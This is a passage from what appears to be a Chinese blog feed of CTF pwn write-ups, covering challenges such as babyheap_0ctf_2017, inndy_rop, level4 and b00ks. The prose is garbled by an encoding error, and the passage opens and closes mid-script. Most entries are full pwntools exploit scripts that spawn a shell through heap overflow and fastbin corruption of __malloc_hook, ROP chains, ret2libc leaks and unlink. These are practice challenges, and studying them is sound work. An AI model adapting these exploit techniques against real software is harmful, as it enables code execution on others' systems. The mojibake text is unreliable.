r.recvuntil(&#39;choice: &#39;)    r.sendline(&#39;3&#39;)    r.recvuntil(&#39;index:&#39;)    r.sendline(str(index))def show(index):    r.recvuntil(&#39;choice: &#39;)    r.sendline(&#39;4&#39;)    r.recvuntil(&#39;index:&#39;)    r.sendline(str(index))  add(0x18)add(0x10)add(0x90)add(0x10)edit(0,0x22,b&#39;b&#39;*0x10+p64(0x20)+p8(0xa1))edit(2,0x80,p64(0)*14+p64(0xa0)+p64(0x21))free(1)add(0x90)edit(1,0x20,p64(0)*3+p64(0xa1))free(2)show(1)r.recvuntil(&#39;content:&#39;)r.recv(0x20)main_arena=u64(r.recvuntil(&#39;\x7f&#39;).strip()[-6:].ljust(8,b&#39;\x00&#39;))-88malloc_hook=main_arena-0x10base=malloc_hook-libc.sym[&#39;__malloc_hook&#39;]realloc_hook=base+libc.sym[&#39;__realloc_hook&#39;]add(0x80)print(hex(main_arena))payload=p64(0)*3+p64(0x71)+p64(0)*12+p64(0x70)+p64(0x21)edit(1,0x90,payload)free(2)payload=p64(0)*3+p64(0x71)+p64(malloc_hook-0x23)edit(1,0x28,payload)add(0x60) #2add(0x60) #4one=[0x45216,0x4526a,0xf02a4,0xf1147]one_gadget=base+one[3]edit(4,0x1b,b&#39;a&#39;*11+p64(one_gadget)+p64(realloc_hook+4))#gdb.attach(r)sleep(1)add(0x10)r.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ciscn_2019_es_7</title>
      <link href="/2024/03/18/ciscn-2019-es-7/"/>
      <url>/2024/03/18/ciscn-2019-es-7/</url>
      
        <content type="html"><![CDATA[<h5 id="åˆé‡srop"><a href="#åˆé‡srop" class="headerlink" title="åˆé‡srop"></a>åˆé‡srop</h5><p><img src="https://i0.imgs.ovh/2024/03/17/e3xQs.png" alt="image-20240318211119440"></p><p><img src="https://i0.imgs.ovh/2024/03/17/e3KTX.png" alt="image-20240318211144301"></p><p>unixåœ¨ç³»ç»Ÿå‘ç”Ÿsignalæ—¶ä¼šé—´æ¥è°ƒç”¨sigreturn,ucontext,siginfoç­‰ä¼šè¢«å‹å…¥æ ˆä¸­,è¿™ä¸€æ®µç§°ä¸ºsignal frame</p><p><img src="https://i0.imgs.ovh/2024/03/17/e3olU.png" alt="image-20240318212003314"></p><p>è¦ç”¨sropï¼Œéœ€æ»¡è¶³å‡ ä¸ªæ¡ä»¶</p><p>å¯ä»¥é€šè¿‡æ ˆæº¢å‡ºæ§åˆ¶æ ˆçš„å†…å®¹ã€‚</p><p>éœ€è¦çŸ¥é“ç›¸åº”çš„åœ°å€ã€‚</p><pre><code>     â€œ/bin/shâ€</code></pre><p>â€‹        Signal Frame</p><p>â€‹        syscall</p><p>â€‹        sigreturn</p><p>é¢˜ç›®ä¸­å·²ç»ç»™äº†æˆ‘ä»¬gadgetsçš„åœ°å€</p><p>é¦–å…ˆå¯ä»¥æ‰“å°å‡ºæ ˆåœ°å€</p><p><img src="https://i0.imgs.ovh/2024/03/17/e3QBm.png" alt="image-20240318213204641"></p><p>å…¶æ¬¡è¿”å›åœ°å€å†™ä¸Šäº†0x4004F1,æ‰“å°å®Œä¼šå†æ¬¡è¿”å›funcå‡½æ•°</p><p><img src="https://i0.imgs.ovh/2024/03/17/e3cvR.png" alt="image-20240318214547353"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>hitcon2014_stkof</title>
      <link href="/2024/03/16/hitcon2014-stkof/"/>
      <url>/2024/03/16/hitcon2014-stkof/</url>
      
        <content type="html"><![CDATA[<h5 id="åç§»éƒ½æ²¡å¼€ï¼Œæœ‰ä¸ªå †æº¢å‡ºæ¼æ´ï¼Œåˆšå·§ä¸ä¹…å‰åšäº†ä¸€é“å †æº¢å‡ºï¼Œä½†æ˜¯åšæ³•å¯¹äºè¿™é“é¢˜æ²¡ä»€ä¹ˆç”¨ï¼Œæ²¡æœ‰showå‡½æ•°ï¼Œæ²¡æœ‰åç§»ä¿æŠ¤å¯ä»¥ç”¨unlink"><a href="#åç§»éƒ½æ²¡å¼€ï¼Œæœ‰ä¸ªå †æº¢å‡ºæ¼æ´ï¼Œåˆšå·§ä¸ä¹…å‰åšäº†ä¸€é“å †æº¢å‡ºï¼Œä½†æ˜¯åšæ³•å¯¹äºè¿™é“é¢˜æ²¡ä»€ä¹ˆç”¨ï¼Œæ²¡æœ‰showå‡½æ•°ï¼Œæ²¡æœ‰åç§»ä¿æŠ¤å¯ä»¥ç”¨unlink" class="headerlink" title="åç§»éƒ½æ²¡å¼€ï¼Œæœ‰ä¸ªå †æº¢å‡ºæ¼æ´ï¼Œåˆšå·§ä¸ä¹…å‰åšäº†ä¸€é“å †æº¢å‡ºï¼Œä½†æ˜¯åšæ³•å¯¹äºè¿™é“é¢˜æ²¡ä»€ä¹ˆç”¨ï¼Œæ²¡æœ‰showå‡½æ•°ï¼Œæ²¡æœ‰åç§»ä¿æŠ¤å¯ä»¥ç”¨unlink"></a>åç§»éƒ½æ²¡å¼€ï¼Œæœ‰ä¸ªå †æº¢å‡ºæ¼æ´ï¼Œåˆšå·§ä¸ä¹…å‰åšäº†ä¸€é“å †æº¢å‡ºï¼Œä½†æ˜¯åšæ³•å¯¹äºè¿™é“é¢˜æ²¡ä»€ä¹ˆç”¨ï¼Œæ²¡æœ‰showå‡½æ•°ï¼Œæ²¡æœ‰åç§»ä¿æŠ¤å¯ä»¥ç”¨unlink</h5><pre><code class="lang-py">add(0x30) #1add(0x30) #2add(0x80) #3add(0x30) #4bss=0x602140+0x10fd=bss-0x18bk=bss-0x10payload=p32(0)+p32(0x30)payload+=p64(fd)+p64(bk)payload+=p64(0)*2payload+=p64(0x30)+p64(0x90)edit(2,payload)</code></pre><p><img src="https://i0.imgs.ovh/2024/03/15/eVoRI.png" alt="image-20240316223611733"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>inndy_rop</title>
      <link href="/2024/03/14/inndy-rop/"/>
      <url>/2024/03/14/inndy-rop/</url>
      
        <content type="html"><![CDATA[<p><img src="https://i0.imgs.ovh/2024/03/13/chENt.png" alt="image-20240314194629081"></p><p>é™¤äº†ä¸ªgetså‡½æ•°å•¥ä¹Ÿæ²¡æœ‰äº†</p><p><img src="https://i0.imgs.ovh/2024/03/13/chDtC.png" alt="image-20240314194446848"></p><h5 id="ç›´æ¥-ROPgadget-â€”binary-inndy-rop-â€”ropchain"><a href="#ç›´æ¥-ROPgadget-â€”binary-inndy-rop-â€”ropchain" class="headerlink" title="ç›´æ¥ ROPgadget â€”binary inndy_rop â€”ropchain"></a>ç›´æ¥ ROPgadget â€”binary inndy_rop â€”ropchain</h5><p><img src="https://i0.imgs.ovh/2024/03/13/chqwm.png" alt="image-20240314194655817"></p><pre><code class="lang-py">from pwn import*from struct import packfrom LibcSearcher import *#p=remote(&quot;node4.buuoj.cn&quot;,)r=process(&quot;./inndy_rop&quot;)context.log_level=&quot;debug&quot;p=b&#39;a&#39;*(0xc+4)p += pack(&#39;&lt;I&#39;, 0x0806ecda) # pop edx ; retp += pack(&#39;&lt;I&#39;, 0x080ea060) # @ .datap += pack(&#39;&lt;I&#39;, 0x080b8016) # pop eax ; retp += b&#39;/bin&#39;p += pack(&#39;&lt;I&#39;, 0x0805466b) # mov dword ptr [edx], eax ; retp += pack(&#39;&lt;I&#39;, 0x0806ecda) # pop edx ; retp += pack(&#39;&lt;I&#39;, 0x080ea064) # @ .data + 4p += pack(&#39;&lt;I&#39;, 0x080b8016) # pop eax ; retp += b&#39;//sh&#39;p += pack(&#39;&lt;I&#39;, 0x0805466b) # mov dword ptr [edx], eax ; retp += pack(&#39;&lt;I&#39;, 0x0806ecda) # pop edx ; retp += pack(&#39;&lt;I&#39;, 0x080ea068) # @ .data + 8p += pack(&#39;&lt;I&#39;, 0x080492d3) # xor eax, eax ; retp += pack(&#39;&lt;I&#39;, 0x0805466b) # mov dword ptr [edx], eax ; retp += pack(&#39;&lt;I&#39;, 0x080481c9) # pop ebx ; retp += pack(&#39;&lt;I&#39;, 0x080ea060) # @ .datap += pack(&#39;&lt;I&#39;, 0x080de769) # pop ecx ; retp += pack(&#39;&lt;I&#39;, 0x080ea068) # @ .data + 8p += pack(&#39;&lt;I&#39;, 0x0806ecda) # pop edx ; retp += pack(&#39;&lt;I&#39;, 0x080ea068) # @ .data + 8p += pack(&#39;&lt;I&#39;, 0x080492d3) # xor eax, eax ; retp += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0806c943) # int 0x80#gdb.attach(p)#sleep(1)r.sendline(p)r.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>level4</title>
      <link href="/2024/03/14/level4/"/>
      <url>/2024/03/14/level4/</url>
      
        <content type="html"><![CDATA[<p>åªå¼€äº†NXä¿æŠ¤ï¼Œ32ä½æ ˆæº¢å‡ºã€‚</p><pre><code class="lang-py">elf = ELF(proc_name)write_plt = elf.plt[&#39;write&#39;]write_got = elf.got[&#39;write&#39;]main_addr = elf.sym[&#39;main&#39;]payload = b&#39;a&#39; * (0x88 + 0x4) + p32(write_plt) + p32(main_addr) + p32(0x1) + p32(write_got) + p32(0x4)</code></pre><h5 id="æ²¡è°ƒç”¨writeå‡½æ•°å‰"><a href="#æ²¡è°ƒç”¨writeå‡½æ•°å‰" class="headerlink" title="æ²¡è°ƒç”¨writeå‡½æ•°å‰"></a>æ²¡è°ƒç”¨writeå‡½æ•°å‰</h5><p><img src="https://i0.imgs.ovh/2024/03/13/c6Qi2.png" alt="image-20240314145631680"></p><h5 id="gotè¡¨å­˜çš„æ˜¯å¯»å€çš„åœ°å€"><a href="#gotè¡¨å­˜çš„æ˜¯å¯»å€çš„åœ°å€" class="headerlink" title="gotè¡¨å­˜çš„æ˜¯å¯»å€çš„åœ°å€"></a>gotè¡¨å­˜çš„æ˜¯å¯»å€çš„åœ°å€<img src="https://i0.imgs.ovh/2024/03/13/c6JpW.png" alt="image-20240314145743045"></h5><h5 id="è·³è½¬åˆ°write-gotå­˜çš„åœ°å€write-plt-6"><a href="#è·³è½¬åˆ°write-gotå­˜çš„åœ°å€write-plt-6" class="headerlink" title="è·³è½¬åˆ°write_gotå­˜çš„åœ°å€write_plt+6"></a>è·³è½¬åˆ°write_gotå­˜çš„åœ°å€write_plt+6</h5><p><img src="https://i0.imgs.ovh/2024/03/13/c64s9.png" alt="image-20240314145920863"></p><p><img src="https://i0.imgs.ovh/2024/03/13/c6dVH.png" alt="image-20240314150124101"></p><p><img src="https://i0.imgs.ovh/2024/03/13/c65iO.png" alt="image-20240314150041605"></p><p><img src="https://i0.imgs.ovh/2024/03/13/c6yjC.png" alt="image-20240314150231093"></p><p><img src="https://i0.imgs.ovh/2024/03/13/cWPVt.png" alt="image-20240314150335322"></p><p><img src="https://i0.imgs.ovh/2024/03/13/cWVkm.png" alt="image-20240314150533997"></p><h5 id="æ€»ç»“èµ·æ¥å°±æ˜¯ï¼Œæ²¡è°ƒç”¨writeå‡½æ•°ä¹‹å‰ï¼Œwrite-gotå­˜çš„æ˜¯write-plt-6è¿™ä¸ªåœ°å€ï¼Œç„¶åæ‰§è¡Œwrite-pltä¼šå»write-goté‡Œæ‰¾writeå‡½æ•°çœŸæ­£çš„åœ°å€ï¼Œæ­¤æ—¶ä¼šæ‰§è¡Œwrite-plt-6è¿™ä¸ªåœ°å€å¯»å€ï¼Œæ‰¾åˆ°writeå‡½æ•°çœŸæ­£çš„åœ°å€åä¼šæŠŠå®ƒå­˜å…¥write-got"><a href="#æ€»ç»“èµ·æ¥å°±æ˜¯ï¼Œæ²¡è°ƒç”¨writeå‡½æ•°ä¹‹å‰ï¼Œwrite-gotå­˜çš„æ˜¯write-plt-6è¿™ä¸ªåœ°å€ï¼Œç„¶åæ‰§è¡Œwrite-pltä¼šå»write-goté‡Œæ‰¾writeå‡½æ•°çœŸæ­£çš„åœ°å€ï¼Œæ­¤æ—¶ä¼šæ‰§è¡Œwrite-plt-6è¿™ä¸ªåœ°å€å¯»å€ï¼Œæ‰¾åˆ°writeå‡½æ•°çœŸæ­£çš„åœ°å€åä¼šæŠŠå®ƒå­˜å…¥write-got" class="headerlink" title="æ€»ç»“èµ·æ¥å°±æ˜¯ï¼Œæ²¡è°ƒç”¨writeå‡½æ•°ä¹‹å‰ï¼Œwrite_gotå­˜çš„æ˜¯write_plt+6è¿™ä¸ªåœ°å€ï¼Œç„¶åæ‰§è¡Œwrite_pltä¼šå»write_goté‡Œæ‰¾writeå‡½æ•°çœŸæ­£çš„åœ°å€ï¼Œæ­¤æ—¶ä¼šæ‰§è¡Œwrite_plt+6è¿™ä¸ªåœ°å€å¯»å€ï¼Œæ‰¾åˆ°writeå‡½æ•°çœŸæ­£çš„åœ°å€åä¼šæŠŠå®ƒå­˜å…¥write_got."></a>æ€»ç»“èµ·æ¥å°±æ˜¯ï¼Œæ²¡è°ƒç”¨writeå‡½æ•°ä¹‹å‰ï¼Œwrite_gotå­˜çš„æ˜¯write_plt+6è¿™ä¸ªåœ°å€ï¼Œç„¶åæ‰§è¡Œwrite_pltä¼šå»write_goté‡Œæ‰¾writeå‡½æ•°çœŸæ­£çš„åœ°å€ï¼Œæ­¤æ—¶ä¼šæ‰§è¡Œwrite_plt+6è¿™ä¸ªåœ°å€å¯»å€ï¼Œæ‰¾åˆ°writeå‡½æ•°çœŸæ­£çš„åœ°å€åä¼šæŠŠå®ƒå­˜å…¥write_got.</h5><p><img src="https://i0.imgs.ovh/2024/03/13/cW2wp.png" alt="image-20240314151444152"></p><p><img src="https://i0.imgs.ovh/2024/03/13/cWnxd.png" alt="image-20240314152016165"></p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import *from LibcSearcher import *context.log_level = &#39;debug&#39;proc_name = &#39;./level4&#39;p = process(proc_name)#p=remote(&#39;node5.buuoj.cn&#39;,29402)                                                                                                                                                   elf = ELF(proc_name)write_plt = elf.plt[&#39;write&#39;]write_got = elf.got[&#39;write&#39;]main_addr = elf.sym[&#39;main&#39;]payload = b&#39;a&#39; * (0x88 + 0x4) + p32(write_plt) + p32(main_addr) + p32(0x1) + p32(write_got) + p32(0x4)gdb.attach(p)sleep(1)p.send(payload)write_addr = u32(p.recv(4))print(hex(write_addr))#libc = LibcSearcher(&#39;write&#39;, write_addr)libc=ELF(&#39;./libc-2.23_32.so&#39;)libc_base = write_addr - libc.sym[&#39;write&#39;]system_addr = libc_base + libc.sym[&#39;system&#39;]str_bin_sh = libc_base + next(libc.search(b&#39;bin/sh&#39;))payload1 = b&#39;a&#39; * (0x88 + 0x4) + p32(system_addr) + p32(main_addr) + p32(str_bin_sh)p.send(payload1)p.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>babyheap_0ctf_2017</title>
      <link href="/2024/03/13/babyheap-0ctf-2017/"/>
      <url>/2024/03/13/babyheap-0ctf-2017/</url>
      
        <content type="html"><![CDATA[<p>ä¿æŠ¤å…¨å¼€</p><h5 id="malloc-addéƒ½æ•´å¾—æŒºæŠ½è±¡çš„ï¼Œä½†éƒ½å¤§åŒå°å¼‚ã€‚è¿™é“é¢˜è¿˜æ˜¯æŒºæœ‰éš¾åº¦çš„"><a href="#malloc-addéƒ½æ•´å¾—æŒºæŠ½è±¡çš„ï¼Œä½†éƒ½å¤§åŒå°å¼‚ã€‚è¿™é“é¢˜è¿˜æ˜¯æŒºæœ‰éš¾åº¦çš„" class="headerlink" title="malloc,addéƒ½æ•´å¾—æŒºæŠ½è±¡çš„ï¼Œä½†éƒ½å¤§åŒå°å¼‚ã€‚è¿™é“é¢˜è¿˜æ˜¯æŒºæœ‰éš¾åº¦çš„"></a>malloc,addéƒ½æ•´å¾—æŒºæŠ½è±¡çš„ï¼Œä½†éƒ½å¤§åŒå°å¼‚ã€‚è¿™é“é¢˜è¿˜æ˜¯æŒºæœ‰éš¾åº¦çš„</h5><p>æœ‰ä¸ªå¡«å……çš„æ—¶å€™çš„sizeå¯ä»¥å¤§äºè‡ªå·±ç”³è¯·çš„ï¼Œæœ‰ä¸ªå †æº¢å‡ºæ¼æ´ã€‚</p><p><img src="https://i0.imgs.ovh/2024/03/12/cnbtX.png" alt="image-20240313194053956"></p><p>å°è¯•æ”¹ä¸‹ä¸ªå †çš„sizeï¼Œå†é‡Šæ”¾ï¼Œå†mallocï¼Œä¼šæŠ¥é”™ï¼Œè¿™ä¸ªæ–¹æ³•ä¸è¡Œã€‚</p><p><img src="https://i0.imgs.ovh/2024/03/12/cHClH.png" alt="image-20240313202940866"></p><p>æ”¹æ‰äº†binæŒ‡é’ˆ</p><p><img src="https://i0.imgs.ovh/2024/03/12/cHpbm.png" alt="image-20240313205043694"></p><p><img src="https://i0.imgs.ovh/2024/03/12/cH61T.png" alt="image-20240313205752854"></p><p><img src="https://i0.imgs.ovh/2024/03/12/cHgnO.png" alt="image-20240313221321740"></p><p><img src="https://i0.imgs.ovh/2024/03/12/cHsn2.png" alt="image-20240313212014082"></p><p><img src="https://i0.imgs.ovh/2024/03/12/cHcT9.png" alt="image-20240313221044009"></p><p><img src="https://i0.imgs.ovh/2024/03/12/cHtoH.png" alt="image-20240313221647152"></p><p><img src="https://i0.imgs.ovh/2024/03/12/cHjys.png" alt="image-20240313222042253"></p><h5 id="å †2æ˜¯æŒ‡å‘free-chunkçš„ï¼Œå¡«å……å †2ä¹Ÿå°±æ˜¯åœ¨fast-binçš„æŒ‡é’ˆä¸Šå†™ä¸Šmalloc-hookä¸Šé¢çš„åœ°å€ï¼Œæº¢å‡ºå †3ä¹Ÿèƒ½æ”¹binæŒ‡é’ˆã€‚è¿™é‡Œçš„åœ°å€æœ‰ä¸€å®šçš„è¦æ±‚ã€‚"><a href="#å †2æ˜¯æŒ‡å‘free-chunkçš„ï¼Œå¡«å……å †2ä¹Ÿå°±æ˜¯åœ¨fast-binçš„æŒ‡é’ˆä¸Šå†™ä¸Šmalloc-hookä¸Šé¢çš„åœ°å€ï¼Œæº¢å‡ºå †3ä¹Ÿèƒ½æ”¹binæŒ‡é’ˆã€‚è¿™é‡Œçš„åœ°å€æœ‰ä¸€å®šçš„è¦æ±‚ã€‚" class="headerlink" title="å †2æ˜¯æŒ‡å‘free_chunkçš„ï¼Œå¡«å……å †2ä¹Ÿå°±æ˜¯åœ¨fast_binçš„æŒ‡é’ˆä¸Šå†™ä¸Šmalloc_hookä¸Šé¢çš„åœ°å€ï¼Œæº¢å‡ºå †3ä¹Ÿèƒ½æ”¹binæŒ‡é’ˆã€‚è¿™é‡Œçš„åœ°å€æœ‰ä¸€å®šçš„è¦æ±‚ã€‚"></a>å †2æ˜¯æŒ‡å‘free_chunkçš„ï¼Œå¡«å……å †2ä¹Ÿå°±æ˜¯åœ¨fast_binçš„æŒ‡é’ˆä¸Šå†™ä¸Šmalloc_hookä¸Šé¢çš„åœ°å€ï¼Œæº¢å‡ºå †3ä¹Ÿèƒ½æ”¹binæŒ‡é’ˆã€‚è¿™é‡Œçš„åœ°å€æœ‰ä¸€å®šçš„è¦æ±‚ã€‚</h5><p><img src="https://i0.imgs.ovh/2024/03/12/cHymu.png" alt="image-20240313230951923"></p><h5 id="åœ¨malloc-hook-0x23çš„åœ°å€ä¸Šï¼Œdword-malloc-hook-0x23-0x8-è¿™ä¸ªåœ°å€çš„å€¼æ˜¯0x7f-æ»¡è¶³0x70å¤§å°çš„fastbinçš„å¤§å°ï¼Œæ‰€ä»¥malloc-hook-0x23è¿™ä¸ªåœ°å€å¯ä»¥å½“ä½œfake-addr-å†å¡«å……0x13å­—èŠ‚åˆ°malloc-hook-å†™ä¸Šone-gadget"><a href="#åœ¨malloc-hook-0x23çš„åœ°å€ä¸Šï¼Œdword-malloc-hook-0x23-0x8-è¿™ä¸ªåœ°å€çš„å€¼æ˜¯0x7f-æ»¡è¶³0x70å¤§å°çš„fastbinçš„å¤§å°ï¼Œæ‰€ä»¥malloc-hook-0x23è¿™ä¸ªåœ°å€å¯ä»¥å½“ä½œfake-addr-å†å¡«å……0x13å­—èŠ‚åˆ°malloc-hook-å†™ä¸Šone-gadget" class="headerlink" title="åœ¨malloc_hook-0x23çš„åœ°å€ä¸Šï¼Œdword(malloc_hook-0x23+0x8)è¿™ä¸ªåœ°å€çš„å€¼æ˜¯0x7f,æ»¡è¶³0x70å¤§å°çš„fastbinçš„å¤§å°ï¼Œæ‰€ä»¥malloc_hook-0x23è¿™ä¸ªåœ°å€å¯ä»¥å½“ä½œfake_addr,å†å¡«å……0x13å­—èŠ‚åˆ°malloc_hook,å†™ä¸Šone_gadget."></a>åœ¨malloc_hook-0x23çš„åœ°å€ä¸Šï¼Œdword(malloc_hook-0x23+0x8)è¿™ä¸ªåœ°å€çš„å€¼æ˜¯0x7f,æ»¡è¶³0x70å¤§å°çš„fastbinçš„å¤§å°ï¼Œæ‰€ä»¥malloc_hook-0x23è¿™ä¸ªåœ°å€å¯ä»¥å½“ä½œfake_addr,å†å¡«å……0x13å­—èŠ‚åˆ°malloc_hook,å†™ä¸Šone_gadget.</h5><p><img src="https://i0.imgs.ovh/2024/03/13/cf7Ou.png" alt="image-20240314130240170"></p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import*from LibcSearcher import *#p=remote(&quot;node5.buuoj.cn&quot;,26041)p=process(&quot;./babyheap_0ctf_2017&quot;)context.log_level=&quot;debug&quot;context(arch=&#39;amd64&#39;,os=&#39;linux&#39;)libc=ELF(&#39;./libc-2.23.so&#39;)def add(size):    p.sendlineafter(&#39;Command: &#39;,&#39;1&#39;)    p.sendlineafter(&#39;Size: &#39;,str(size))def full(index,size,content):    p.sendlineafter(&#39;Command: &#39;,&#39;2&#39;)    p.sendlineafter(&#39;Index: &#39;,str(index))    p.sendlineafter(&#39;Size: &#39;,str(size))    p.sendlineafter(&#39;Content: &#39;,content)def free(index):    p.sendlineafter(&#39;Command: &#39;,&#39;3&#39;)    p.sendlineafter(&#39;Index: &#39;,str(index))def show(index):    p.sendlineafter(&#39;Command: &#39;,&#39;4&#39;)    p.sendlineafter(&#39;Index:&#39;,str(index))add(0x10) #0 add(0x10) #1add(0x10) #2add(0x10) #3add(0x80) #4free(1)free(2)payload=p64(0)*3+p64(0x21)+p64(0)*3+p64(0x20)+p8(0x80)full(0,0x41,payload)payload=p64(0)*3+p64(0x21)full(3,0x20,payload)add(0x10) #1add(0x10) #2--&gt;4payload=p64(0)*3+p64(0x91)full(3,0x20,payload)add(0x30) #é˜²æ­¢åˆå¹¶free(4)show(2)p.recvuntil(&quot;Content:&quot;)main_addr=u64(p.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))-88print(hex(main_addr))base=main_addr-0x10-libc.sym[&#39;__malloc_hook&#39;]system=base+libc.sym[&#39;system&#39;]add(0x60) #4free(4)fake_addr=main_addr-0x10-0x23full(2,0x8,p64(fake_addr))&#39;&#39;&#39;orpayload=p64(0)*3+p64(0x71)+p64(fake_addr)full(3,0x28,payload)&#39;&#39;&#39;gdb.attach(p)sleep(1)add(0x60) #5add(0x60) #6one=[0x45216,0x4526a,0xf02a4,0xf1147]one_gadget=base+one[1]payload=b&#39;a&#39;*0x13+p64(one_gadget)full(6,0x1b,payload)add(0x10)p.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SWPUCTF_2019_login</title>
      <link href="/2024/03/12/SWPUCTF-2019-login/"/>
      <url>/2024/03/12/SWPUCTF-2019-login/</url>
      
        <content type="html"><![CDATA[<p><img src="https://i0.imgs.ovh/2024/03/12/c2zXv.png" alt="image-20240313150317142"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>STKOF</title>
      <link href="/2024/03/11/stkof/"/>
      <url>/2024/03/11/stkof/</url>
      
        <content type="html"><![CDATA[<h5 id="ä¸¤é“ç¨‹åºé¢˜ï¼Œä¸€é“32ä½ä¸€é“64ä½ï¼Œéƒ½æ˜¯æ ˆæº¢å‡ºçš„é¢˜"><a href="#ä¸¤é“ç¨‹åºé¢˜ï¼Œä¸€é“32ä½ä¸€é“64ä½ï¼Œéƒ½æ˜¯æ ˆæº¢å‡ºçš„é¢˜" class="headerlink" title="ä¸¤é“ç¨‹åºé¢˜ï¼Œä¸€é“32ä½ä¸€é“64ä½ï¼Œéƒ½æ˜¯æ ˆæº¢å‡ºçš„é¢˜"></a>ä¸¤é“ç¨‹åºé¢˜ï¼Œä¸€é“32ä½ä¸€é“64ä½ï¼Œéƒ½æ˜¯æ ˆæº¢å‡ºçš„é¢˜</h5><p><img src="https://i0.imgs.ovh/2024/03/10/R2zsu.png" alt="image-20240311205640177"></p><p><img src="https://i0.imgs.ovh/2024/03/10/R2t8p.png" alt="image-20240311205417765"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>b00ks</title>
      <link href="/2024/03/11/b00ks/"/>
      <url>/2024/03/11/b00ks/</url>
      
        <content type="html"><![CDATA[<p><img src="https://i0.imgs.ovh/2024/03/10/RPetI.png" alt="image-20240311142425453"></p><h5 id="ç”©åˆ°è„¸ä¸Šçš„off-by-one"><a href="#ç”©åˆ°è„¸ä¸Šçš„off-by-one" class="headerlink" title="ç”©åˆ°è„¸ä¸Šçš„off-by-one"></a>ç”©åˆ°è„¸ä¸Šçš„off-by-one</h5><p><img src="https://i0.imgs.ovh/2024/03/10/RPckj.png" alt="image-20240311141823683"></p><h5 id="æ˜¯ä¸€ä¸ªå›¾ä¹¦ç®¡ç†ç³»ç»Ÿ"><a href="#æ˜¯ä¸€ä¸ªå›¾ä¹¦ç®¡ç†ç³»ç»Ÿ" class="headerlink" title="æ˜¯ä¸€ä¸ªå›¾ä¹¦ç®¡ç†ç³»ç»Ÿ"></a>æ˜¯ä¸€ä¸ªå›¾ä¹¦ç®¡ç†ç³»ç»Ÿ</h5><p><img src="https://i0.imgs.ovh/2024/03/10/RP1wJ.png" alt="image-20240311142646867"></p><h5 id="è¿™é‡Œå¯ä»¥è¦†ç›–æ‰å­˜å †åœ°å€çš„ä¸€ä¸ªå­—èŠ‚ï¼Œå¯ä»¥å®ç°æ”¹å †åœ°å€çš„æ“ä½œ"><a href="#è¿™é‡Œå¯ä»¥è¦†ç›–æ‰å­˜å †åœ°å€çš„ä¸€ä¸ªå­—èŠ‚ï¼Œå¯ä»¥å®ç°æ”¹å †åœ°å€çš„æ“ä½œ" class="headerlink" title="è¿™é‡Œå¯ä»¥è¦†ç›–æ‰å­˜å †åœ°å€çš„ä¸€ä¸ªå­—èŠ‚ï¼Œå¯ä»¥å®ç°æ”¹å †åœ°å€çš„æ“ä½œ"></a>è¿™é‡Œå¯ä»¥è¦†ç›–æ‰å­˜å †åœ°å€çš„ä¸€ä¸ªå­—èŠ‚ï¼Œå¯ä»¥å®ç°æ”¹å †åœ°å€çš„æ“ä½œ</h5><p><img src="https://i0.imgs.ovh/2024/03/10/RPiZe.png" alt="image-20240311142945990"></p><p><img src="https://i0.imgs.ovh/2024/03/10/RPJOW.png" alt="image-20240311142840161"></p><h5 id="æ‰“å°çš„æ—¶å€™ä¼šè¿å †åœ°å€ä¹Ÿæ‰“å°å‡ºæ¥"><a href="#æ‰“å°çš„æ—¶å€™ä¼šè¿å †åœ°å€ä¹Ÿæ‰“å°å‡ºæ¥" class="headerlink" title="æ‰“å°çš„æ—¶å€™ä¼šè¿å †åœ°å€ä¹Ÿæ‰“å°å‡ºæ¥"></a>æ‰“å°çš„æ—¶å€™ä¼šè¿å †åœ°å€ä¹Ÿæ‰“å°å‡ºæ¥</h5><pre><code class="lang-py">add(0x80,&#39;cccccccc&#39;,0x60,&#39;dddddddd&#39;)add(0x10,&#39;eeeeeeee&#39;,0x10,&#39;ffffffff&#39;)free(2)edit(1,p64(1)+p64(heap_addr+0x30)+p64(heap_addr+0x30+0x90+0xe0+0x10)+p64(0x20))</code></pre><p><img src="https://i0.imgs.ovh/2024/03/10/RV2Qp.png" alt="image-20240311151905833"></p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import*from LibcSearcher import *p=remote(&quot;node5.buuoj.cn&quot;,25494)#p=process(&quot;./b00ks&quot;)context.log_level=&quot;debug&quot;libc=ELF(&#39;./libc-2.23.so&#39;)elf=ELF(&#39;./b00ks&#39;)payload=b&#39;k&#39;*0x1f+b&#39;b&#39;p.sendlineafter(&#39;Enter author name: &#39;,payload)def add(size1,content1,size2,content2):    p.sendlineafter(&#39;&gt; &#39;,&#39;1&#39;)    p.sendlineafter(&#39;Enter book name size:&#39;,str(size1))    p.sendlineafter(&#39;Enter book name (Max 32 chars):&#39;,content1)    p.sendlineafter(&#39;Enter book description size:&#39;,str(size2))    p.sendlineafter(&#39;Enter book description:&#39;,content2)def edit(idd,content):    p.sendlineafter(&#39;&gt; &#39;,&#39;3&#39;)    p.sendlineafter(&#39;Enter the book id you want to edit: &#39;,str(idd))    